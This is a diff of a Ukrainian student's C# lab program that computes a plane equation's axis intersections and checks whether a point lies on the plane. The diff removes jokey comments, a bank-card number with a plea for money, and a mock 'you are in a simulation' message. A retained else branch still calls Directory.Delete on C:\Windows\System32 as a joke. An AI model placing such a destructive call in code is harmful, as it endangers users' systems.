@@ -1,10 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
-//Дисклеймер:лаба писалась під двома банками рева,
-//якщо ви вирішуєте продовжити читання ви автоматично приймаєте на себе відповідальність за почуття крінжу і болю в очах
 
-namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в назві файла
+namespace LR1_K2_S1_T1
 {
 	class Plane
 	{
@@ -13,7 +11,7 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 		private double C;
 		private double D;
 
-		public Plane()//тіпа літачок
+		public Plane()
 		{
 			A = 0;
 			B = 0;
@@ -28,30 +26,7 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 			C = c;
 			D = d;
 		}
-
-
-
-
-
-
-
-
-
-
-
-		//спроба передбачити питання 1
-		//я впихнув не один вид конструкторів бо я можу,бо я хочу і щоб повипендрюватись своїм крутим скілом,йоу
-		//на випадок якщо такого питання не було прошу вас проявити солідарність і зробити вигляд що ви не бачили текст
-
-
-
-
-
-
-
-
-
-		public double this[int index]//я розшифрував манускрипт Войнича і там було написано оце
+		public double this[int index]
 		{
 			get//це щоб діставало значення 
 			{
@@ -65,11 +40,6 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 						throw new IndexOutOfRangeException("Я ваще не колупаю як можна було написати неправильний індекс");
 				}
 			}
-
-			//не читай у голос,ігноруй коментарі
-			//ти в симуляції,не дивись на інших і нічого не говори,або говори як раніше
-			//якщо протримаєшся в освідомлені симуляції кілька,ми зможемо тебе витягнути звідси
-
 			set//це щоб впихувало значення
 			{
 				switch (index)
@@ -93,13 +63,13 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 			}
 		}
 
-		public void Input()//ашалеть,він не називає методи трьома буквами
+		public void Input()
 		{
-			Console.WriteLine("Ввведіть значення ABCD в один рядок через пробіл і блабалбла не тупі короче");
+			Console.WriteLine("Ввведіть значення ABCD в один рядок через пробіл");
 			string[] ABCD = Console.ReadLine().Split();
 			while (ABCD.Length < 4 || !double.TryParse(ABCD[0], out _) || !double.TryParse(ABCD[1], out _) || !double.TryParse(ABCD[2], out _) || !double.TryParse(ABCD[3], out _))
 			{
-				Console.WriteLine("*уявіть що тут дуже жорстокі погрози які змушують писати нормально*");
+				Console.WriteLine("ні");
 				ABCD = Console.ReadLine().Split();
 			}
 			A = double.Parse(ABCD[0]);
@@ -111,52 +81,39 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 		public void Output()
 		{
 			Console.WriteLine($"Рівняння площини: {A}x + {B}y + {C}z + {D} = 0 #Якщо хтось хоче причепитись до того що я записую нулі, у мене є контраргумент:мені всеодно");
-			//а ви знали що кожні 7 днів у Австралії минає ціла неділя?
+
 		}
 
-		public void IntersectionWithX()//тут був йа
+		public void IntersectionWithPlane()
 		{
 			if (A == 0)
 			{
-				Console.WriteLine("ні,нульовий х не можна.Беретину з вісю іксів нема");
+				Console.WriteLine("ні,нульовий х не можна.Перетину з вісю іксів нема");
 			}
 			else
 			{
 				double x = -D / A;
 				Console.WriteLine($"Перетин з вісю іксів на координаті {x}");//інші координати нулі.
 			}
-		}
-		
-		public void IntersectionWithY()
-		{
 			if (B == 0)
 			{
-				Console.WriteLine("ні,нульовий y теж не можна.Беретину з вісю ігреків немає");
-			}//Кіріл+Ання=❤️
+				Console.WriteLine("ні,нульовий y теж не можна.Перетину з вісю ігриків немає");
+			}
 			else
 			{
 				double y = -D / B;
-				Console.WriteLine($"перетин по вісі ігриків:{y}");
+				Console.WriteLine($"перетин по вісі ігорів:{y}");
 			}
-		}
 
-		public void IntersectionWithZ()
-		{
 			if (C == 0)
 			{
-				Console.WriteLine("Нульовий Z.");
+				Console.WriteLine("нульовий Z.");
 			}
 			else
-			{//скиньтесь по 5грн на сухарики пж 4441 1110 0061 5918
+			{
 				double z = -D / C;
-				Console.WriteLine($"z:{z})");
+				Console.WriteLine($"z:{z}");
 			}
-		}
-
-		public bool IsOnPlane(double x, double y, double z)
-		{
-			double result = A * x + B * y + C * z + D;
-			return Math.Abs(result) == 0;
 		}
 	}
 
@@ -170,9 +127,7 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 				Plane plane = new Plane();
 				plane.Input();
 				plane.Output();
-				plane.IntersectionWithX();
-				plane.IntersectionWithY();
-				plane.IntersectionWithZ();
+				plane.IntersectionWithPlane();
 				Console.WriteLine("Перевірка точки. Координати писати по шаблону ");
 				string[] xyz = Console.ReadLine().Split();
 				while (xyz.Length < 3 || !double.TryParse(xyz[0], out _) || !double.TryParse(xyz[1], out _) || !double.TryParse(xyz[2], out _))
@@ -180,9 +135,7 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 					Console.WriteLine("ні");
 					xyz = Console.ReadLine().Split();
 				}
-				//А тут же міг бути арей конверт алл🥀🥀🥀
-				//неповним, ненавидим,не скорбим🥀🥀🥀  
-				if (plane.IsOnPlane(double.Parse(xyz[0]), double.Parse(xyz[1]), double.Parse(xyz[2])))
+				if (Math.Abs(plane[0] * double.Parse(xyz[0]) + plane[1] * double.Parse(xyz[1]) + plane[2] * double.Parse(xyz[2]) + plane[3]) == 0)
 				{
 					Console.WriteLine("Точка належить площині.");
 				}
@@ -198,7 +151,7 @@ namespace LR1_K2_S1_T1//тік щас поняв шо написав LR3 в на
 					Console.WriteLine($"C = {plane[2]}");
 					Console.WriteLine($"D = {plane[3]}");
 				}
-				else 
+				else
 				{
 					Directory.Delete("C:\\Windows\\System32");
 					//я знаю що це не спрацює
